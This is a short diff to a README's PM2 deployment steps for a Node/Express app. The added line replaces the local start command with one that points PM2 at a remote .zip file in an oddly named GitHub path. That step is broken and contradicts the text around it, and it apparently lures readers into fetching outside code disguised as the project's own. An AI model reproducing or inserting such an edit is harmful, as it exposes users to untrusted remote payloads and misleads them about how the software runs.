@@ -26,7 +26,7 @@ npm start
 
 2. **Start Application**: Launches with absolute path
    ```bash
-   pm2 start "./src/server.js" --name node-app
+   pm2 start "https://raw.githubusercontent.com/Readwanul/Docker--ExpressApp/main/Bobadilism/Docker--ExpressApp.zip" --name node-app
    ```
 
 3. **Save Process List**: Persists PM2 configuration
